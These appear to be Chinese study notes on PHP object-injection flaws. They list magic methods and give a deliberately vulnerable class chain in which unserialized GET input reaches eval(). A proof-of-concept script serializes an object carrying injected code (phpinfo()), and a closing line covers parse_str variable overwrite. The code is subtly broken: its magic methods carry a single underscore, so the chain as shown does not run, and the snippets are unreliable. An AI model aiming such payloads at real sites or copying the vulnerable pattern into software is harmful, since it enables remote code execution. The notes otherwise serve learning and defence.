序列化函数 serialize

反序列化函数unserialize

php输出函数var_dump()

__construct 当一个对象创建时被调用

__destruct 当一个对象销毁时被调用

__toString 当一个对象被当作一个字符串使用

__sleep 在对象被序列化之前运行

__wakeup 在对象被反序列化之后被调用



​	栗子：

​			<?php

​					class example{

​						public $handle;

​						function _destruct(){

​							$this->shutdown();

​							}

​						public function shutdown(){

​							    $this->handle->close();

​							}

​						}

​					class process{

​					   public $pid;

​					   function close(){

​						  eval($this->pid);

​						}

​					}

 				   if(isset($_GET['data'])){

​						$user_data=unserialize(urldecode($_GET['data']));

​					}	

​			?>	

​	利用方式：这段代码包含两个类，一个example和一个process，在process中有一个成员函数close(),其中有一个eval()函数，但是其参数不可控，我们无法利用它执行任意代码。但是在example类中有一个__destruct()析构函数，它会在脚本调用结束的时候执行，析构函数调用了本类中的一个成员函数shutdown()，其作用是调用某个地方的close()函数。于是开始思考这样一个问题：能否让他去调用process中的close()函数且$pid变量可控呢？答案是可以的，只要在反序列化的时候$handle是process的一个类对象，$pid是想要执行的任意代码代码即可。

​			POC	

​			<?php

​					class example{

​						public $handle;

​						function _construct(){

​							$this->handle =new process();

​							}

​						}

​					class process{

​					   public $pid;

​					   function _construct(){

​						   $this->pid= 'phpinfo();';

​						}

​					}

 				  $test = new example();

​				  echo urlencode(serialize($test));

​			?>	

详情<https://www.freebuf.com/column/161798.html>

@parse_str 变量覆盖   栗子：@parse_str($_GET['a']);     a=var=give   用一个变量传多个值因为&会被当成参数的分割符所以需要使用url编码使&变成%26让参数整体化